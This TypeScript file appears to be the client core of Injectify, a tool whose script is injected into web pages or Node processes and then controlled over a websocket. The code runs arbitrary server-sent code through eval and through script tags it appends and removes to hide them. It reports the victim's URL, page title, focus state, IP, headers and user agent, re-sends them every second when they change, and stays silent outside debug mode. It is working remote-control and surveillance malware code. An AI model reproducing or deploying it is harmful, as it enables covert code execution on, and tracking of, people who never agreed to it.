declare var ws: any
declare var client: any
declare var process: any
declare var require: any

/**
 * Injectify core API
 * @class
 */

window['injectify'] = class Injectify {
	/**
	 * Overrides the message handler for the websocket connection
	 * @param {function} callback Callback to be triggered once message received
	 */
	static listener(callback: Function) {
		ws.onmessage = message => {
			try {
				let data = JSON.parse(message.data)
				
				if (this['listeners'] && data.t && this['listeners'][data.t]) {
					/**
					 * Pre-process some topic's data
					 */
					if (data.t == 'pong') {
						data.d = +new Date - data.d
					}
					/**
					 * Callback the listeners
					 */
					this['listeners'][data.t].callback(data.d)
					if (this['listeners'][data.t].once) delete this['listeners'][data.t]
				} else {
					callback(data.d, data.t)
				}
			} catch(e) {
				if (this.debug) throw e
				this.error(e.stack)
			}
		}
	}
	/**
	 * Listen for a topic from websocket connection
	 * @param {string} topic Topic name to listen to
	 * @param {function} callback Callback to be triggered once topic received
	 */
	static listen(topic: string, callback, once?: boolean) {
		if (!once) once = false
		if (!this['listeners']) this['listeners'] = {}
		this['listeners'][topic] = {
			callback: data => {
				callback(data)
			},
			raw: callback,
			once: once
		}
	}
	/**	
	 * Unhook a websocket topic listener
	 * @param {string} topic Topic name to unlisten
	 * @param {function} callback
	 */
	static unlisten(topic: string, callback?: any) {
		/**
		 * If the listener is missing, return false
		 */
		if (!this['listeners'] ||
			!this['listeners'][topic] ||
			!this['listeners'][topic].callback ||
			!this['listeners'][topic].raw ||
			(
				callback &&
				callback.toString() !== this['listeners'][topic].raw.toString()
			)
		) return false
		return delete this['listeners'][topic]
	}
	/**
	 * Send data to websocket
	 * @param {string} topic Message topic
	 * @param {Object} data Message data
	 */
	static send(topic: string, data?: any) {
		/**
		 * If the websocket is dead, return
		 */
		if (ws.readyState == 0) return
		try {
			ws.send(JSON.stringify({
				t: topic,
				d: data,
			}))
		} catch(e) {
			if (this.debug) console.error(e)
		}
	}
	/**
	 * Log data to websocket connection (and locally)
	 * @param {(Object|string)} message Data to be logged
	 * @param {boolean} local Whether to log it in the local console
	 */
	static log(message: any, local?: boolean) {
		this.send('l', message)
		if (local) console.log(message)
	}
	/**
	 * Get the websocket ping time (in milliseconds)
	 * @param {function} callback Callback to be executed on ping complete
	 */
	static ping(callback?: any) {
		this.send('ping', + new Date())
		if (callback) this.listen('pong', callback, true)
	}
	/**
	 * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
	 * @param {string} func the contents inside the <script> tag
	 * @param {element} targetParent element to execute the script under, defaults to document.head
	 */
	static exec(func, targetParent?: any) {
		if (this.info.platform === 'browser') {
			/**
			 * Default o using document.head as the script container
			 */
			if (!targetParent) targetParent = document.head
			/**
			 * Turn the function into a self-executing constructor
			 */
			if (typeof func === 'function') func = '(function(){' + func.toString() + '})()'
			/**
			 * Create, append & remove a script tag
			 */
			var script = document.createElement('script')
			script.innerHTML = func
			targetParent.appendChild(script)
			targetParent.removeChild(script)
		} else {
			if (typeof func === 'string') {
				eval('(' + func + ')()')
			} else {
				func()
			}
		}
	}
	/**
	 * Loads a module from the injectify server
	 * @param {string} name module name
	 * @param {(string|Object)} params parameters to be sent to the module
	 * @param {function} callback optional callback once the module has been loaded
	 */
	static module(name, params?: any, callback?: any, errorCallback?: any) {
		let token = +new Date
		/**
		 * Parse the parameters
		 */
		if (typeof params === 'function') {
			callback = params
			if (typeof callback === 'function') window['e' + token] = callback
		}
		if (typeof callback === 'function') window[token] = callback
		if (typeof errorCallback === 'function') window['e' + token] = errorCallback
		/**
		 * Emit to server
		 */
		this.send('module', {
			name: name,
			token: token,
			params: params
		})
	}
	/**
	 * Injectify authentication API
	 */
	static auth(token?: any) {
		let auth = new Image
		if (token) {
			auth.src = this.info.server.url + '/a?id=' + encodeURIComponent(this.info.id) + '&token=' + encodeURIComponent(token) + '&z=' + +new Date
		} else {
			/**
			 * Send a connection request to the server
			 * 
			 * 1. Make a request to /a with our socket connection ID
			 * 2. Server reads cookies and attempts to find our token
			 * 3. If it can't be found it, the server sets a new cookie
			 * 4. Server gets the passed socket ID and inserts us into database
			 * 5. All this is done server-side with the below two lines
			 */
			auth.src = this.info.server.url + '/a?id=' + encodeURIComponent(this.info.id) + '&z=' + +new Date
		}
		/**
		 * Make sure request is sent
		 */
		auth.onload
	}
	/**
	 * Check that the Injectify core is active
	 */
	static get present() {
		return true
	}
	/**
	 * Returns information about Injectify
	 */
	static get info() {
		/**
		 * Read the project name from the URL
		 */
		var project = ws.url.split('?')[1]
		if (this.debug) project = project.substring(1)
		/**
		 * Parse the server URL from the websocket url
		 */
		var server = ws.url.split('/')
		var protocol = 'https://'
		if (server[0] === 'ws:') protocol = 'http://'
		server = protocol + server[2]

		return {
			'project'    : atob(project),
			'server': {
				'websocket': ws.url,
				'url'      : server
			},
			'id'		 : client.id,
			'platform'   : client.platform,
			'duration'   : this.duration,
			'debug'      : this.debug,
			'os'		 : client.os,
			'ip'         : client.ip,
			'headers'    : client.headers,
			'user-agent' : client.agent
		}
	}
	/**
	 * Returns information about the current session, browser etc.
	 */
	static get sessionInfo() {
		if (this.info.platform === 'browser') {
			/**
			 * Get the correct document.hidden method
			 */
			let hidden = 'hidden'
			if ('mozHidden' in document) {
				hidden = 'mozHidden'
			} else if ('webkitHidden' in document) {
				hidden = 'webkitHidden'
			} else if ('msHidden' in document) {
				hidden = 'msHidden'
			}
			/**
			 * Return object
			 */
			return {
				'window': {
					'url': window.location.href,
					'title': document.title ? document.title : window.location.host + window.location.pathname,
					'active': !document[hidden],
				}
			}
		} else {
			return {
				'window': {
					'url': require('file-url')(process.cwd()),
					'title': process.cwd(),
					'active': true,
				}
			}
		}
	}
	/**
	 * Sends the session info to the server
	*/
	static sendSession() {
		let sessionInfo = injectify.sessionInfo
		if (this.debug) console.warn('🕵🏼 Delivered session info to server', sessionInfo)
		this.send('i', sessionInfo)
	}
	/**
	 * Returns whether injectify is in debug mode or not
	 * true  - being used in development
	 * false - console output should be suppressed
	 */
	static get debug() {
		return ws.url.split('?')[1].charAt(0) == "$"
	}
	/**
	 * Returns the amount of time connected to injectify server
	 */
	static get duration() {
		let duration = (+new Date - this['connectTime']) / 1000
		return Math.round(duration)
	}
	/**
	 * Error handler
	 * @param {error} error The error to be handled
	 */
	static error(error) {
		// this['errorLimiting']++
		// if (this['errorLimiting'] >= 20) {
		// 	setTimeout(function() {
		// 		console.log('called!')
		// 		this['errorLimiting'] = 0
		// 	}, 100)
		// } else {
			this.send('e', error)
		// }
	}
}
/**
 * Create local reference to window.injectify
 */
let injectify = window['injectify']

/**
 * If the session state is undefined, define it
 */
if (!window['inJl1']) window['inJl1'] = {
	listeners: {
		visibility: false,
		timed: {
			active: false
		}
	}
}
let global = window['inJl1']
window['global'] = global

/**
 * Set the connect time
 */
injectify.connectTime = +new Date

/**
 * Debug helpers
 */
if (injectify.debug) {
	console.warn('⚡️ Injectify core.ts loaded! => https://github.com/samdenty99/injectify', injectify.info)
}

/**
 * Send session info to the Injectify server
 */
injectify.sendSession()


/**
 * Replace the basic websocket handler with a feature-rich one
 */
injectify.listener((data, topic) => {
	try {
		if (topic == 'stay-alive') {
			return
		}
		if (topic == 'error') {
			injectify.exec('console.error(' + JSON.stringify(data) + ')')
			return
		}
		if (topic == 'module') {
			/**
			 * Create the module object
			 */
			var module = {
				name: data.name,
				token: data.token,
				callback: window[data.token] || function() {}, // Fallback function if no callback was specified
				returned: undefined,
				config: {
					async: false
				}
			}

			if (!data.error) {
				/**
				 * Evaluate the script
				 */
				eval(data.script)

				/**
				 * If in debug mode display verbose output
				 */
				if (injectify.debug) {
					console.warn('📦 Executed module "' + module.name + '"', module)
				}

				/**
				 * If the module isn't asynchronous call it's callback
				 */
				if (!module.config.async && data !== false && typeof module.callback == 'function') {
					module.callback(module.returned)
				}

				/**
				 * Delete it's synchronous callback
				 */
				return delete window[data.token]
			} else if (injectify.debug && data.error.message) {
				console.error('📦 ' + data.error.message, module)
			}
		}
		if (topic == 'execute' || topic == 'core') {
			eval(data)
		}
	} catch(e) {
		injectify.error(e.stack)
	}
});

/**
 * Page Visibility API
 */
(() => {
	if (injectify.info.platform === 'browser') {
		/**
		 * Make sure it's not already listening
		*/
		if (global.listeners.visibility) return
		/**
		 * Set a global variable to prevent listener from being called multiple times
		*/
		global.listeners.visibility = true

		let listener
		let focusChange = () => injectify.sendSession()
		
		/**
		 * Get the correct hidden listener
		 */
		if ('hidden' in document) {
			listener = 'visibilitychange'
		} else if ('mozHidden' in document) {
			listener = 'mozvisibilitychange'
		} else if ('webkitHidden' in document) {
			listener = 'webkitvisibilitychange'
		} else if ('msHidden' in document) {
			listener = 'msvisibilitychange'
		} else {
			window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
		}
		/**
		 * Add listener
		 */
		if (listener) document.addEventListener(listener, focusChange)
	}
})();

/**
 * Session info logger
 */
(() => {
	if (global.listeners.timed.active) {
		return
	} else {
		global.listeners.timed.active = true;
		(function sessionInfo() {
			let currentState = JSON.stringify(injectify.sessionInfo)
			if (currentState !== global.listeners.timed.prevState) {
				/**
				 * If the previous state was defined
				 */
				if (global.listeners.timed.prevState) injectify.sendSession()
				global.listeners.timed.prevState = currentState
			}
			setTimeout(sessionInfo, 1000)
		})()
	}
})()

/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping'])
window['ping'] = setInterval(() => {
	injectify.send('heartbeat')
}, 10 * 1000)